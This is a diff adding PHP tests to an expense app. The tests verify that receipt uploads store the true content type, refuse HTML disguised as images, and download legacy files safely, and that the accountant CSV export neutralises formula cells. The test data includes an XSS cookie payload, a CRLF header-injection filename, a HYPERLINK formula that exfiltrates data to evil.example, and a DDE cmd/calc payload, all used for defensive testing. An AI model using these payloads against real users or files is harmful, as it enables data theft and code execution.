@@ -4,6 +4,7 @@ declare(strict_types=1);
 
 use App\Models\Contact;
 use App\Models\Expense;
+use App\Models\ExpenseAttachment;
 use App\Models\LookupItem;
 use App\Models\ServiceReport;
 use App\Models\Tenant;
@@ -247,6 +248,38 @@ test('can upload and download multiple receipts including PDF vouchers', functio
         ->assertHeader('Content-Type', 'application/pdf');
 });
 
+test('receipts keep the type of their content, and only pdf and images are ever shown inline', function (): void {
+    $category = LookupItem::whereHas('category', fn ($q) => $q->where('code', 'expense_category'))->firstOrFail();
+    $expense = Expense::create(['tenant_id' => $this->tenantA->id, 'expense_number' => 'EXP-2026-0098', 'category_id' => $category->id, 'date' => '2026-10-28', 'amount_gross' => 10.0, 'currency' => 'EUR']);
+
+    // A real PNG whose client claims to be HTML: the stored type and extension come from the bytes.
+    $png = tempnam(sys_get_temp_dir(), 'receipt-');
+    file_put_contents($png, base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg=='));
+    $upload = $this->actingAs($this->userA)->postJson("/api/v1/expenses/{$expense->id}/attachments", ['file' => new UploadedFile($png, 'receipt.html.png', 'text/html', null, true)])->assertCreated();
+    $attachment = ExpenseAttachment::query()->findOrFail($upload->json('data.0.id'));
+
+    expect($attachment->mime_type)->toBe('image/png')->and($attachment->path)->toEndWith('.png');
+
+    $this->actingAs($this->userA)->get("/api/v1/expenses/{$expense->id}/attachments/{$attachment->id}/download?inline=1")
+        ->assertOk()->assertHeader('Content-Type', 'image/png')->assertHeader('X-Content-Type-Options', 'nosniff')
+        ->assertHeader('Content-Disposition', 'inline; filename=receipt.html.png');
+
+    // HTML content is refused whatever the name, and a legacy row stored with the claimed type is downloaded, never rendered.
+    $html = tempnam(sys_get_temp_dir(), 'receipt-');
+    file_put_contents($html, '<html><body><script>alert(document.cookie)</script></body></html>');
+    $this->actingAs($this->userA)->postJson("/api/v1/expenses/{$expense->id}/attachments", ['file' => new UploadedFile($html, 'receipt.png', 'image/png', null, true)])->assertUnprocessable();
+
+    Storage::disk($attachment->getStorageDisk())->put($attachment->path, '<script>alert(1)</script>');
+    $attachment->forceFill(['mime_type' => 'text/html', 'original_name' => "evil\".html\r\nX-Injected: 1"])->save();
+
+    $legacy = $this->actingAs($this->userA)->get("/api/v1/expenses/{$expense->id}/attachments/{$attachment->id}/download?inline=1")->assertOk();
+
+    expect($legacy->headers->get('Content-Type'))->toBe('application/octet-stream')
+        ->and($legacy->headers->get('Content-Disposition'))->toStartWith('attachment;')
+        ->and($legacy->headers->get('Content-Security-Policy'))->toContain("default-src 'none'")
+        ->and($legacy->headers->has('X-Injected'))->toBeFalse();
+});
+
 test('updating and deleting expense works and is blocked once exported to accountant', function (): void {
     $category = LookupItem::whereHas('category', fn ($q) => $q->where('code', 'expense_category'))->firstOrFail();
 
@@ -319,6 +352,22 @@ test('accountant export generates CSV with statutory columns and stamps exported
 
     $exportedExpense = Expense::where('expense_number', 'EXP-2026-0201')->firstOrFail();
     expect($exportedExpense->isExported())->toBeTrue();
+});
+
+test('the accountant csv neutralises cells a spreadsheet would run as formulas', function (): void {
+    $category = LookupItem::whereHas('category', fn ($q) => $q->where('code', 'expense_category'))->firstOrFail();
+
+    Expense::create([
+        'tenant_id' => $this->tenantA->id, 'expense_number' => 'EXP-2026-0301', 'category_id' => $category->id, 'date' => '2026-10-15',
+        'amount_gross' => 12.0, 'currency' => 'EUR', 'merchant_name' => '=HYPERLINK("http://evil.example/?"&A1,"Click")', 'notes' => '@SUM(1+1)*cmd|\' /C calc\'!A0',
+    ]);
+
+    $csv = $this->actingAs($this->userA)->get('/api/v1/expenses/export?format=csv')->assertOk()->getContent();
+
+    expect($csv)->toContain('"\'=HYPERLINK(')
+        ->and($csv)->toContain('\'@SUM(1+1)')
+        ->and($csv)->not->toMatch('/[,\n]"?=HYPERLINK/')
+        ->and($csv)->toContain('12.00');
 });
 
 test('reporting summary provides monthly, category, project and supplier aggregations', function (): void {
